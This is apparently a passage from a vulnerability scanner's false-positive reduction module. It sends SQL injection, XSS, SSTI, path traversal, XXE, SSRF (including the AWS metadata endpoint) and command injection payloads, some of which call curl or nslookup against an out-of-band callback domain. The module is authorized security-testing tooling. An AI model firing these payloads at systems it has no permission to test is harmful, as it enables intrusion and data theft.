"""FPReducer — 3-layer False Positive / False Negative reduction engine.

The single biggest quality differentiator vs Nessus/Acunetix.
Every confirmed finding goes through 3 layers before being reported:

    Layer 1: Baseline  — N clean responses → median time + size
    Layer 2: Probe     — inject payload → compare delta
    Layer 3: Confirm   — re-probe with variant → require 2/2 match

Confidence levels:
    HIGH       — 2/2 probes confirmed. Default report.
    MEDIUM     — 1/2 or statistically marginal. Default report, flagged.
    LOW        — Single probe, weak signal. Needs-verification section only.
    UNVERIFIED — No secondary verification possible. --verbose only.

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import html
import hashlib
import logging
import re
import statistics
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Optional

log = logging.getLogger("forge.fp_reducer")


# ══════════════════════════════════════════════════════════════════════
# DATA MODELS
# ══════════════════════════════════════════════════════════════════════

class Confidence(str, Enum):
    """Finding confidence level after FP reduction."""
    HIGH       = "HIGH"       # 2/2 confirmed → include in default report
    MEDIUM     = "MEDIUM"     # 1/2 or marginal → include but flag
    LOW        = "LOW"        # Single probe only → needs-verification section
    UNVERIFIED = "UNVERIFIED" # Cannot verify (no OOB, no canary) → verbose only


class ConfidenceBand(Enum):
    """Semantic confidence bands for cross-module finding assessment."""
    CONFIRMED     = "confirmed"
    LIKELY        = "likely"
    POSSIBLE      = "possible"
    INFORMATIONAL = "informational"


@dataclass
class VerificationResult:
    """Result of FP verification for a single finding."""
    confidence:     Confidence
    confirmed:      bool                = False
    probe_count:    int                 = 0
    probe_hits:     int                 = 0
    evidence:       list[str]           = field(default_factory=list)
    baseline_time:  float               = 0.0
    probe_times:    list[float]         = field(default_factory=list)
    error:          str                 = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "confidence": self.confidence.value,
            "confirmed": self.confirmed,
            "probe_count": self.probe_count,
            "probe_hits": self.probe_hits,
            "evidence": self.evidence,
            "baseline_time": self.baseline_time,
            "probe_times": self.probe_times,
            "error": self.error,
        }


@dataclass
class BaselineResult:
    """Baseline response characteristics."""
    median_time:    float
    stdev_time:     float
    median_size:    int
    sample_count:   int
    status_codes:   list[int]


def _normalise_method(method: str) -> str:
    """Return a supported HTTP method name."""
    normalized = (method or "GET").upper()
    if normalized not in {"GET", "POST"}:
        raise ValueError(f"Unsupported verification method: {method!r}")
    return normalized


def _classify_result(result: VerificationResult, *, single_probe_can_confirm: bool = False) -> None:
    """Apply one confidence policy across verifier implementations."""
    if result.probe_count <= 0:
        result.confidence = Confidence.UNVERIFIED
        result.confirmed = False
    elif result.probe_hits >= 2:
        result.confidence = Confidence.HIGH
        result.confirmed = True
    elif result.probe_hits == 1:
        result.confidence = Confidence.HIGH if single_probe_can_confirm else Confidence.MEDIUM
        result.confirmed = single_probe_can_confirm
    else:
        result.confidence = Confidence.LOW
        result.confirmed = False


def _looks_like_block_page(status: int, body: str) -> bool:
    """Detect generic WAF/auth/rate-limit responses that should not confirm findings."""
    haystack = (body or "")[:4096].lower()
    block_markers = (
        "request rejected",
        "requested url was rejected",
        "access denied",
        "blocked by",
        "web application firewall",
        "mod_security",
        "modsecurity",
        "cloudflare",
        "akamai",
        "imperva",
        "support id",
        "rate limit",
        "too many requests",
    )
    return status in {401, 403, 406, 429, 451} and any(marker in haystack for marker in block_markers)


def _xss_payload_executably_reflected(body: str, canary: str) -> bool:
    """Return True only when the canary appears in raw executable HTML/JS context.

    Checks that the payload is not HTML-entity-encoded and appears in
    a script block, event handler, or javascript: URI context.
    """
    if canary not in body:
        return False
    escaped = html.escape(canary)
    if escaped in body and canary not in html.unescape(body):
        return False
    # Check if the canary itself is entity-encoded at its location
    # (only reject if encoding is proximate to the payload, not globally)
    encoded_delimiters = ("&lt;script", "&#60;script", "&lt;img", "&#60;img", "&lt;svg", "&#60;svg")
    body_lower = body.lower()
    canary_idx = body_lower.find(canary.lower())
    if canary_idx >= 0:
        # Check a window around the payload for encoded markers
        window_start = max(0, canary_idx - 30)
        window_end = min(len(body_lower), canary_idx + len(canary) + 30)
        window = body_lower[window_start:window_end]
        if any(marker in window for marker in encoded_delimiters):
            return False
    patterns = (
        rf"<script\b[^>]*>[^<]*{re.escape(canary)}",
        rf"\bon(?:error|load)\s*=\s*['\"][^'\"]*{re.escape(canary)}",
        rf"\bon(?:error|load)\s*=\s*[^>\s]+{re.escape(canary)}",
        rf"javascript\s*:\s*alert\s*\([^)]*{re.escape(canary)}",
    )
    return any(re.search(pattern, body, re.IGNORECASE) for pattern in patterns)


# ══════════════════════════════════════════════════════════════════════
# HTTP REQUEST HELPER
# ══════════════════════════════════════════════════════════════════════

async def _http_get(
    url: str,
    params: dict[str, str] | None = None,
    headers: dict[str, str] | None = None,
    timeout: float = 15.0,
    session: Any = None,
) -> tuple[int, str, float]:
    """Make an async HTTP GET. Returns (status, body, elapsed_seconds).

    Uses aiohttp if available, falls back to urllib via thread pool
    to avoid blocking the event loop.
    """
    # Try aiohttp first (non-blocking native async)
    try:
        import aiohttp
        start = time.monotonic()
        try:
            _sess = session or aiohttp.ClientSession()
            try:
                async with _sess.get(
                    url, params=params, headers=headers or {},
                    timeout=aiohttp.ClientTimeout(total=timeout),
                    ssl=False,
                ) as resp:
                    body = await resp.text(errors="replace")
                    elapsed = time.monotonic() - start
                    return resp.status, body[:65536], elapsed
            finally:
                if not session:
                    await _sess.close()
        except Exception as exc:
            elapsed = time.monotonic() - start
            return 0, str(exc), elapsed
    except ImportError:
        pass

    # Fallback: urllib in thread pool (non-blocking wrapper)
    import urllib.request
    import urllib.parse

    def _blocking_get() -> tuple[int, str, float]:
        _start = time.monotonic()
        try:
            _url = url
            if params:
                qs = urllib.parse.urlencode(params)
                _url = f"{_url}?{qs}" if "?" not in _url else f"{_url}&{qs}"
            req = urllib.request.Request(_url, headers=headers or {})
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read(65536).decode("utf-8", errors="replace")
                status = resp.status
        except Exception as exc:
            _elapsed = time.monotonic() - _start
            return 0, str(exc), _elapsed
        _elapsed = time.monotonic() - _start
        return status, body, _elapsed

    return await asyncio.to_thread(_blocking_get)


async def _http_post(
    url: str,
    data: dict[str, str] | str | None = None,
    headers: dict[str, str] | None = None,
    timeout: float = 15.0,
) -> tuple[int, str, float]:
    """Make an async HTTP POST. Returns (status, body, elapsed_seconds).

    Uses aiohttp if available, falls back to urllib via thread pool.
    """
    # Try aiohttp first
    try:
        import aiohttp
        start = time.monotonic()
        try:
            async with aiohttp.ClientSession() as sess:
                post_data = data
                if isinstance(data, dict):
                    # aiohttp handles dict data natively
                    async with sess.post(
                        url, data=data, headers=headers or {},
                        timeout=aiohttp.ClientTimeout(total=timeout),
                        ssl=False,
                    ) as resp:
                        body = await resp.text(errors="replace")
                        elapsed = time.monotonic() - start
                        return resp.status, body[:65536], elapsed
                else:
                    async with sess.post(
                        url, data=(data or "").encode() if isinstance(data, str) else b"",
                        headers=headers or {},
                        timeout=aiohttp.ClientTimeout(total=timeout),
                        ssl=False,
                    ) as resp:
                        body = await resp.text(errors="replace")
                        elapsed = time.monotonic() - start
                        return resp.status, body[:65536], elapsed
        except Exception as exc:
            elapsed = time.monotonic() - start
            return 0, str(exc), elapsed
    except ImportError:
        pass

    # Fallback: urllib in thread pool
    import urllib.request
    import urllib.parse

    def _blocking_post() -> tuple[int, str, float]:
        _start = time.monotonic()
        try:
            if isinstance(data, dict):
                post_data = urllib.parse.urlencode(data).encode()
            elif isinstance(data, str):
                post_data = data.encode()
            else:
                post_data = b""

            hdrs = dict(headers or {})
            if "Content-Type" not in hdrs:
                hdrs["Content-Type"] = "application/x-www-form-urlencoded"

            req = urllib.request.Request(url, data=post_data, headers=hdrs, method="POST")
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                body = resp.read(65536).decode("utf-8", errors="replace")
                status = resp.status
        except Exception as exc:
            _elapsed = time.monotonic() - _start
            return 0, str(exc), _elapsed
        _elapsed = time.monotonic() - _start
        return status, body, _elapsed

    return await asyncio.to_thread(_blocking_post)


# ══════════════════════════════════════════════════════════════════════
# BASELINE ENGINE
# ══════════════════════════════════════════════════════════════════════

async def _collect_baseline(
    url: str,
    param: str,
    method: str = "GET",
    baseline_value: str = "forge_baseline",
    n: int = 3,
    headers: dict[str, str] | None = None,
) -> BaselineResult:
    """Collect N baseline responses for a URL/parameter.

    Returns statistical characteristics of clean (non-malicious)
    responses — used as the comparison baseline for probes.
    """
    times: list[float] = []
    sizes: list[int] = []
    status_codes: list[int] = []

    for _ in range(n):
        await asyncio.sleep(0.2)  # small jitter between baselines
        if method.upper() == "POST":
            status, body, elapsed = await _http_post(
                url, data={param: baseline_value}, headers=headers
            )
        else:
            status, body, elapsed = await _http_get(
                url, params={param: baseline_value}, headers=headers
            )
        times.append(elapsed)
        sizes.append(len(body))
        status_codes.append(status)

    median_t = statistics.median(times)
    stdev_t = statistics.stdev(times) if len(times) > 1 else 0.0
    median_s = int(statistics.median(sizes))

    return BaselineResult(
        median_time=median_t,
        stdev_time=stdev_t,
        median_size=median_s,
        sample_count=n,
        status_codes=status_codes,
    )


# ══════════════════════════════════════════════════════════════════════
# VERIFICATION METHODS
# ══════════════════════════════════════════════════════════════════════

async def verify_sqli_time(
    url: str,
    param: str,
    payloads: list[str] | None = None,
    method: str = "GET",
    delay: float = 5.0,
    headers: dict[str, str] | None = None,
    baseline_n: int = 3,
) -> VerificationResult:
    """Verify time-based SQL injection.

    Algorithm:
        1. 3 baseline requests → median time
        2. Probe with time-delay payload → must exceed baseline + delay - 1s
        3. Probe with variant payload → must again exceed threshold
        → HIGH if both probes trigger, MEDIUM if 1/2, LOW if 0/2
    """
    default_payloads = [
        f"'||(SELECT SLEEP({int(delay)}))||'",
        f"' AND SLEEP({int(delay)})-- -",
        f"1; WAITFOR DELAY '0:0:{int(delay)}'--",
        f"' OR pg_sleep({int(delay)})--",
        f"'||dbms_pipe.receive_message(('a'),{int(delay)})||'",
    ]
    probes = payloads if payloads else default_payloads[:2]

    result = VerificationResult(confidence=Confidence.UNVERIFIED)

    try:
        method = _normalise_method(method)
        baseline = await _collect_baseline(url, param, method=method,
                                            headers=headers, n=baseline_n)
        result.baseline_time = baseline.median_time
        threshold = baseline.median_time + delay - 1.0

        result.probe_count = min(len(probes), 2)
        for probe in probes[:2]:
            await asyncio.sleep(0.3)
            if method == "POST":
                _, _, elapsed = await _http_post(
                    url, data={param: probe}, headers=headers, timeout=delay + 15
                )
            else:
                _, _, elapsed = await _http_get(
                    url, params={param: probe}, headers=headers, timeout=delay + 15
                )
            result.probe_times.append(elapsed)
            if elapsed >= threshold:
                result.probe_hits += 1
                result.evidence.append(
                    f"Time-based SQLi: response took {elapsed:.2f}s "
                    f"(threshold={threshold:.2f}s, baseline={baseline.median_time:.2f}s)"
                )

        _classify_result(result)

    except Exception as exc:
        result.error = str(exc)
        result.confidence = Confidence.UNVERIFIED

    return result


async def verify_sqli_error(
    url: str,
    param: str,
    payloads: list[str] | None = None,
    method: str = "GET",
    headers: dict[str, str] | None = None,
) -> VerificationResult:
    """Verify error-based SQL injection.

    Requires DB-specific error signatures, not generic 500 errors.
    Checks 2 different DB error patterns across 2 probe variants.
    """
    db_error_patterns = [
        # MySQL
        r"you have an error in your sql syntax",
        r"supplied argument is not a valid MySQL",
        r"Warning.*mysql_.*\(",
        r"MySqlException",
        r"com\.mysql\.",
        # MSSQL
        r"Unclosed quotation mark after the character string",
        r"Incorrect syntax near",
        r"Microsoft OLE DB Provider for SQL Server",
        r"SqlException",
        r"\[SQL Server\]",
        r"Msg \d+, Level \d+",
        # PostgreSQL
        r"PostgreSQL.*ERROR",
        r"PSQLException",
        r"pg_query\(\)",
        r"unterminated quoted string",
        # Oracle
        r"ORA-\d{5}",
        r"Oracle error",
        r"oracle\.jdbc",
        # SQLite
        r"SQLite.*error",
        r"no such column",
        # Generic
        r"syntax error.*SQL",
        r"ODBC.*Driver.*Error",
    ]

    default_payloads = ["'", "''", "' OR '1'='1", r"' OR 1=1--", "\\"]
    probes = payloads if payloads else default_payloads[:2]

    result = VerificationResult(confidence=Confidence.UNVERIFIED)

    try:
        method = _normalise_method(method)
        result.probe_count = min(len(probes), 2)
        for probe in probes[:2]:
            await asyncio.sleep(0.3)
            if method == "POST":
                status, body, _ = await _http_post(
                    url, data={param: probe}, headers=headers
                )
            else:
                status, body, _ = await _http_get(
                    url, params={param: probe}, headers=headers
                )
            if _looks_like_block_page(status, body):
                result.evidence.append(
                    f"SQL error probe ignored generic block page (status={status}, probe={probe!r})"
                )
                continue
            body_lower = body.lower()
            matched = [p for p in db_error_patterns
                       if re.search(p, body_lower, re.IGNORECASE)]
            if matched:
                result.probe_hits += 1
                result.evidence.append(
                    f"Error-based SQLi: DB error pattern matched — {matched[0]!r} "
                    f"(probe={probe!r}, status={status})"
                )

        _classify_result(result)

    except Exception as exc:
        result.error = str(exc)

    return result


async def verify_xss_reflected(
    url: str,
    param: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
) -> VerificationResult:
    """Verify reflected XSS with UUID canary.

    Embeds a unique UUID canary in the payload. Requires exact canary
    reflection in the response — not just any HTML echo.

    2 probe rounds with different encoding variants.
    """
    result = VerificationResult(confidence=Confidence.UNVERIFIED)

    try:
        method = _normalise_method(method)
        canary = uuid.uuid4().hex[:16]

        probe_variants = [
            f'<script>alert("{canary}")</script>',
            f'"><img src=x onerror="alert(\'{canary}\')">',
            f"'><svg onload=alert('{canary}')>",
            f"javascript:alert('{canary}')",
        ]

        result.probe_count = 2
        for probe in probe_variants[:2]:
            await asyncio.sleep(0.2)
            if method == "POST":
                status, body, _ = await _http_post(url, data={param: probe}, headers=headers)
            else:
                status, body, _ = await _http_get(url, params={param: probe}, headers=headers)

            if _looks_like_block_page(status, body):
                result.evidence.append(
                    f"XSS probe ignored generic block page (status={status}, probe={probe[:40]!r})"
                )
                continue

            if _xss_payload_executably_reflected(body, canary):
                result.probe_hits += 1
                result.evidence.append(
                    f"XSS canary reflected in executable context: {canary!r} "
                    f"(probe={probe[:40]!r})"
                )
            elif canary in body:
                result.evidence.append(
                    f"XSS canary reflected only in escaped/non-executable context: {canary!r}"
                )

        _classify_result(result)

    except Exception as exc:
        result.error = str(exc)

    return result


async def verify_ssti(
    url: str,
    param: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
) -> VerificationResult:
    """Verify Server-Side Template Injection with math proof.

    Math proof: {{7*7}} must reflect 49.
    Variant:    {{7*'7'}} must reflect 7777777 (Jinja2) or 49 (Twig).
    Both probes must succeed for HIGH confidence.
    """
    result = VerificationResult(confidence=Confidence.UNVERIFIED)

    probes = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("#{7*7}", "49"),
        ("*{7*7}", "49"),
        ("{{7*'7'}}", "7777777"),  # Jinja2
    ]

    try:
        method = _normalise_method(method)
        result.probe_count = 2
        for probe, expected in probes[:2]:
            await asyncio.sleep(0.2)
            if method == "POST":
                status, body, _ = await _http_post(url, data={param: probe}, headers=headers)
            else:
                status, body, _ = await _http_get(url, params={param: probe}, headers=headers)

            if _looks_like_block_page(status, body):
                result.evidence.append(
                    f"SSTI probe ignored generic block page (status={status}, probe={probe!r})"
                )
                continue
            if probe in body:
                result.evidence.append(
                    f"SSTI probe reflected literally, not evaluated: {probe!r}"
                )
                continue
            if re.search(rf"(?<![\w.-]){re.escape(expected)}(?![\w.-])", body):
                result.probe_hits += 1
                result.evidence.append(
                    f"SSTI math proof: {probe!r} → {expected!r} found in response"
                )

        _classify_result(result)

    except Exception as exc:
        result.error = str(exc)

    return result


async def verify_ssrf(
    url: str,
    param: str,
    oob_server: str = "",
    method: str = "GET",
    headers: dict[str, str] | None = None,
    collab_client: Any = None,
) -> VerificationResult:
    """Verify SSRF via OOB callback or strong internal response differential.

    With ForgeCollab: OOB callback = HIGH confidence.
    Without OOB: strong internal response = MEDIUM (higher FP risk).
    """
    result = VerificationResult(confidence=Confidence.UNVERIFIED)

    try:
        method = _normalise_method(method)
        if collab_client:
            # OOB mode — highest confidence
            token = collab_client.register("fp_reducer", "ssrf", url, param)
            oob_url = collab_client.build_url(token)

            await asyncio.sleep(0.2)
            if method == "POST":
                _, _, _ = await _http_post(url, data={param: oob_url}, headers=headers)
            else:
                _, _, _ = await _http_get(url, params={param: oob_url}, headers=headers)

            got_callback = await collab_client.wait_for_callback(token, timeout=10.0)
            result.probe_count = 1
            if got_callback:
                result.probe_hits = 1
                result.evidence.append(
                    f"SSRF OOB confirmed: callback received for token {token[:8]}"
                )
            else:
                result.evidence.append(
                    "SSRF: no OOB callback within 10s — possible but unconfirmed"
                )
            _classify_result(result, single_probe_can_confirm=True)

        elif oob_server:
            # External OOB server without ForgeCollab client
            token = uuid.uuid4().hex[:16]
            callback_url = f"http://{token}.{oob_server}/"

            await asyncio.sleep(0.2)
            if method == "POST":
                _, body, _ = await _http_post(url, data={param: callback_url}, headers=headers)
            else:
                _, body, _ = await _http_get(url, params={param: callback_url}, headers=headers)

            result.probe_count = 1
            result.evidence.append(f"SSRF: payload injected, OOB domain: {token}.{oob_server}")
            _classify_result(result)

        else:
            # Internal response differential — check for internal content
            internal_targets = [
                "http://127.0.0.1/",
                "http://169.254.169.254/latest/meta-data/",  # AWS IMDSv1
                "http://192.168.1.1/",
            ]

            for internal in internal_targets[:1]:
                if method == "POST":
                    status, body, _ = await _http_post(url, data={param: internal}, headers=headers)
                else:
                    status, body, _ = await _http_get(url, params={param: internal}, headers=headers)

                if _looks_like_block_page(status, body):
                    result.evidence.append(
                        f"SSRF probe ignored generic block page (status={status}, target={internal})"
                    )
                    continue

                # Look for internal content signatures
                internal_sigs = [
                    r"ami-id", r"instance-id", r"local-ipv4",  # AWS metadata
                    r"root:x:0:0",  # /etc/passwd
                    r"<title>.*router.*</title>",  # Router login
                    r"apache server status",
                    r"redis_version",
                    r"cluster_name",
                    r"apiVersion.*kubernetes",
                ]
                matched = [p for p in internal_sigs if re.search(p, body, re.IGNORECASE)]
                if matched:
                    result.probe_hits += 1
                    result.evidence.append(f"SSRF internal content detected: {matched[0]!r}")

            result.probe_count = 1
            _classify_result(result)

    except Exception as exc:
        result.error = str(exc)

    return result


async def verify_lfi(
    url: str,
    param: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
) -> VerificationResult:
    """Verify LFI by checking for known file content.

    /etc/passwd: root:x:0:0 signature.
    /etc/hosts: 127.0.0.1 localhost
    Windows: [extensions] or [boot loader]
    """
    result = VerificationResult(confidence=Confidence.UNVERIFIED)

    lfi_probes = [
        ("../../../../../../etc/passwd", r"root:x:0:0"),
        ("../../../../../../etc/hosts", r"127\.0\.0\.1\s+localhost"),
        ("../../../../../../windows/win.ini", r"\[extensions\]|\[boot loader\]"),
        ("/etc/passwd", r"root:x:0:0"),
        ("....//....//....//etc/passwd", r"root:x:0:0"),
        ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", r"root:x:0:0"),
    ]

    try:
        method = _normalise_method(method)
        result.probe_count = 2
        for probe, expected_pattern in lfi_probes[:2]:
            await asyncio.sleep(0.2)
            if method == "POST":
                status, body, _ = await _http_post(url, data={param: probe}, headers=headers)
            else:
                status, body, _ = await _http_get(url, params={param: probe}, headers=headers)

            if _looks_like_block_page(status, body):
                result.evidence.append(
                    f"LFI probe ignored generic block page (status={status}, probe={probe!r})"
                )
                continue
            if re.search(expected_pattern, body, re.IGNORECASE):
                result.probe_hits += 1
                result.evidence.append(
                    f"LFI confirmed: {expected_pattern!r} found in response "
                    f"(probe={probe!r})"
                )

        _classify_result(result)

    except Exception as exc:
        result.error = str(exc)

    return result


async def verify_cmdi(
    url: str,
    param: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    collab_client: Any = None,
) -> VerificationResult:
    """Verify command injection via OOB callback or unique output token.

    With OOB: inject curl/wget/nslookup callback → OOB = HIGH confidence.
    Without OOB: inject id/whoami token → check for uid= in response.
    """
    result = VerificationResult(confidence=Confidence.UNVERIFIED)

    try:
        method = _normalise_method(method)
        if collab_client:
            token = collab_client.register("fp_reducer", "cmdi", url, param)
            oob_domain = collab_client.build_dns_payload(token)

            oob_probes = [
                f";nslookup {oob_domain}#",
                f"|curl http://{oob_domain}/",
                f"$(curl http://{oob_domain}/)",
                f"`curl http://{oob_domain}/`",
                f"& ping -n 1 {oob_domain} &",
            ]

            result.probe_count = 2
            for probe in oob_probes[:2]:
                if method == "POST":
                    await _http_post(url, data={param: probe}, headers=headers)
                else:
                    await _http_get(url, params={param: probe}, headers=headers)
                await asyncio.sleep(1.0)

            got_callback = await collab_client.wait_for_callback(token, timeout=8.0)
            if got_callback:
                result.probe_hits = 2
                result.evidence.append(f"CMDi OOB confirmed: DNS/HTTP callback for {token[:8]}")
            _classify_result(result)

        else:
            # Output-based: inject unique token, look for uid= response
            unique_token = uuid.uuid4().hex[:8]
            output_probes = [
                f";echo {unique_token}",
                f"|echo {unique_token}",
                f"$(echo {unique_token})",
                f"`echo {unique_token}`",
            ]

            result.probe_count = 2
            for probe in output_probes[:2]:
                await asyncio.sleep(0.2)
                if method == "POST":
                    status, body, _ = await _http_post(url, data={param: probe}, headers=headers)
                else:
                    status, body, _ = await _http_get(url, params={param: probe}, headers=headers)

                if _looks_like_block_page(status, body):
                    result.evidence.append(
                        f"CMDi probe ignored generic block page (status={status}, probe={probe!r})"
                    )
                    continue

                # Check for command output token in a bounded context, not broad page noise.
                token_match = re.search(
                    rf"(?<![0-9a-f]){re.escape(unique_token)}(?![0-9a-f])",
                    body,
                    re.IGNORECASE,
                )
                uid_match = re.search(r"\buid=\d+\([^)]*\)\s+gid=\d+\(", body)
                if token_match or uid_match:
                    result.probe_hits += 1
                    result.evidence.append(
                        "CMDi output confirmed: bounded token or uid/gid signature found"
                    )

            _classify_result(result)

    except Exception as exc:
        result.error = str(exc)

    return result


async def verify_xxe(
    url: str,
    param: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    collab_client: Any = None,
) -> VerificationResult:
    """Verify XXE via OOB DNS callback or file content extraction."""
    result = VerificationResult(confidence=Confidence.UNVERIFIED)

    try:
        method = _normalise_method(method)
        if collab_client:
            token = collab_client.register("fp_reducer", "xxe", url, param)
            oob_domain = collab_client.build_dns_payload(token)

            xxe_payloads = [
                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oob_domain}/"> ]><foo>&xxe;</foo>',
                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{token}.{oob_domain}/xxe"> ]><root>&xxe;</root>',
            ]

            result.probe_count = len(xxe_payloads)
            for payload in xxe_payloads:
                hdrs = dict(headers or {})
                hdrs["Content-Type"] = "application/xml"
                if method == "POST":
                    await _http_post(url, data=payload, headers=hdrs)
                else:
                    await _http_get(url, params={param: payload}, headers=hdrs)
                await asyncio.sleep(0.5)

            got_callback = await collab_client.wait_for_callback(token, timeout=8.0)
            if got_callback:
                result.probe_hits = result.probe_count
                result.evidence.append(f"XXE OOB confirmed: DNS callback for {token[:8]}")
            _classify_result(result)

        else:
            # Local file read attempt
            xxe_file_payload = (
                '<?xml version="1.0"?><!DOCTYPE foo ['
                '<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
                '<root>&xxe;</root>'
            )
            hdrs = dict(headers or {})
            hdrs["Content-Type"] = "application/xml"
            if method == "POST":
                status, body, _ = await _http_post(url, data=xxe_file_payload, headers=hdrs)
            else:
                status, body, _ = await _http_get(url, params={param: xxe_file_payload}, headers=hdrs)

            result.probe_count = 1
            if not _looks_like_block_page(status, body) and re.search(r"root:x:0:0", body):
                result.probe_hits = 1
                result.evidence.append("XXE file read confirmed: /etc/passwd content in response")
            _classify_result(result, single_probe_can_confirm=True)

    except Exception as exc:
        result.error = str(exc)

    return result


# ══════════════════════════════════════════════════════════════════════
# MAIN FPREDUCER CLASS
# ══════════════════════════════════════════════════════════════════════

def _vpr_label_from_cvss(cvss: float) -> str:
    """Map CVSS score to VPR priority label string."""
    if cvss >= 9.0: return "CRITICAL"
    if cvss >= 7.0: return "HIGH"
    if cvss >= 4.0: return "MEDIUM"
    if cvss > 0.0:  return "LOW"
    return "INFO"


class FPReducer:
    """3-layer False Positive reduction engine.

    Retrofit existing modules by calling verify() before reporting.
    Confidence below MEDIUM is suppressed from default reports.

    Usage in a scanner module::

        from common.fp_reducer import FPReducer, Confidence

        reducer = FPReducer(collab_client=collab)
        result = await reducer.verify(
            vuln_type="sqli_time",
            url="https://target.com/search",
            param="q",
            method="GET",
        )
        if result.confidence in (Confidence.HIGH, Confidence.MEDIUM):
            self.save_finding(title="SQL Injection", confidence=result.confidence.value)
    """

    SUPPRESS_BELOW = {Confidence.LOW, Confidence.UNVERIFIED}

    def __init__(
        self,
        collab_client: Any = None,
        headers: dict[str, str] | None = None,
        time_delay: float = 5.0,
        baseline_n: int = 3,
        verify_timeout: float = 15.0,
    ) -> None:
        self._collab = collab_client
        self._headers = headers or {}
        self._time_delay = time_delay
        self._baseline_n = baseline_n
        self._verify_timeout = verify_timeout

    async def verify(
        self,
        vuln_type: str,
        url: str,
        param: str,
        method: str = "GET",
        payloads: list[str] | None = None,
        **kwargs: Any,
    ) -> VerificationResult:
        """Dispatch to the appropriate verifier based on vuln_type.

        Args:
            vuln_type: One of: sqli_time, sqli_error, xss, ssti, ssrf,
                       lfi, cmdi, xxe
            url:       Target URL.
            param:     Parameter name to inject into.
            method:    HTTP method (GET/POST).
            payloads:  Optional custom payloads (overrides defaults).

        Returns:
            VerificationResult with confidence and evidence.
        """
        vt = vuln_type.lower().replace("-", "_")

        verifiers = {
            "sqli_time": lambda: verify_sqli_time(
                url, param, payloads=payloads, method=method,
                delay=self._time_delay, headers=self._headers,
                baseline_n=self._baseline_n,
            ),
            "sqli_error": lambda: verify_sqli_error(
                url, param, payloads=payloads, method=method,
                headers=self._headers,
            ),
            "xss": lambda: verify_xss_reflected(
                url, param, method=method, headers=self._headers,
            ),
            "xss_reflected": lambda: verify_xss_reflected(
                url, param, method=method, headers=self._headers,
            ),
            "ssti": lambda: verify_ssti(
                url, param, method=method, headers=self._headers,
            ),
            "ssrf": lambda: verify_ssrf(
                url, param, method=method, headers=self._headers,
                collab_client=self._collab,
            ),
            "lfi": lambda: verify_lfi(
                url, param, method=method, headers=self._headers,
            ),
            "rfi": lambda: verify_lfi(
                url, param, method=method, headers=self._headers,
            ),
            "cmdi": lambda: verify_cmdi(
                url, param, method=method, headers=self._headers,
                collab_client=self._collab,
            ),
            "cmd_inject": lambda: verify_cmdi(
                url, param, method=method, headers=self._headers,
                collab_client=self._collab,
            ),
            "xxe": lambda: verify_xxe(
                url, param, method=method, headers=self._headers,
                collab_client=self._collab,
            ),
        }

        verifier_fn = verifiers.get(vt)
        if not verifier_fn:
            log.warning("No verifier for vuln_type=%s — returning UNVERIFIED", vuln_type)
            return VerificationResult(
                confidence=Confidence.UNVERIFIED,
                error=f"No verifier implemented for {vuln_type!r}",
            )

        log.debug("FPReducer: verifying %s at %s[%s]", vuln_type, url, param)
        try:
            return await asyncio.wait_for(
                verifier_fn(), timeout=self._verify_timeout,
            )
        except asyncio.TimeoutError:
            log.warning(
                "FPReducer.verify timed out after %.1fs (%s @ %s[%s])",
                self._verify_timeout, vuln_type, url, param,
            )
            return VerificationResult(
                confidence=Confidence.LOW,
                error=f"Verification timed out after {self._verify_timeout}s",
                evidence=[f"timeout:{self._verify_timeout}s"],
            )
        except Exception as exc:
            log.error("FPReducer.verify error (%s): %s", vuln_type, exc)
            return VerificationResult(
                confidence=Confidence.UNVERIFIED,
                error=str(exc),
            )

    def should_report(self, result: VerificationResult) -> bool:
        """Return True if this result should appear in the default report."""
        return result.confidence not in self.SUPPRESS_BELOW

    def format_confidence_badge(self, result: VerificationResult) -> str:
        """Return a formatted badge string for log/report output."""
        badges = {
            Confidence.HIGH: "✅ HIGH",
            Confidence.MEDIUM: "⚠️  MEDIUM",
            Confidence.LOW: "🔶 LOW",
            Confidence.UNVERIFIED: "❓ UNVERIFIED",
        }
        return badges.get(result.confidence, "?")


# ══════════════════════════════════════════════════════════════════════
# FN DETECTION HELPERS (Pillar 10B)
# ══════════════════════════════════════════════════════════════════════

def suggest_followup_modules(
    confirmed_vuln: str,
    finding: dict[str, Any],
) -> list[dict[str, str]]:
    """Suggest follow-up modules based on confirmed vulnerabilities.

    Called after each confirmed finding to catch related FN opportunities.

    Args:
        confirmed_vuln: Vuln type that was just confirmed.
        finding:        The finding dict.

    Returns:
        List of {module, reason} dicts for suggested follow-up tests.
    """
    suggestions: list[dict[str, str]] = []
    vt = confirmed_vuln.lower()

    if "sqli" in vt:
        suggestions += [
            {"module": "sqli_scanner", "reason": "Second-order SQLi — inject then trigger"},
            {"module": "sqli_scanner", "reason": "Stored SQLi — stored payload fired on admin view"},
            {"module": "xxe_scanner", "reason": "SQLi may expose XML processing paths"},
        ]
    if "file_upload" in vt or "upload" in vt:
        suggestions += [
            {"module": "file_upload", "reason": "Polyglot file upload (JPEG+PHP, GIF+JS)"},
            {"module": "file_upload", "reason": "Double extension bypass (.php.jpg)"},
            {"module": "file_upload", "reason": "Null byte injection (file.php%00.jpg)"},
        ]
    if "ssrf" in vt:
        suggestions += [
            {"module": "ssrf_scanner", "reason": "Blind SSRF via Gopher/FTP protocol"},
            {"module": "ssrf_scanner", "reason": "AWS IMDSv1 credential extraction via SSRF"},
            {"module": "ssrf_scanner", "reason": "Redis/Memcached internal access via SSRF"},
        ]
    if "jwt" in vt:
        suggestions += [
            {"module": "jwt_scanner", "reason": "alg:none bypass"},
            {"module": "jwt_scanner", "reason": "Weak HMAC brute force"},
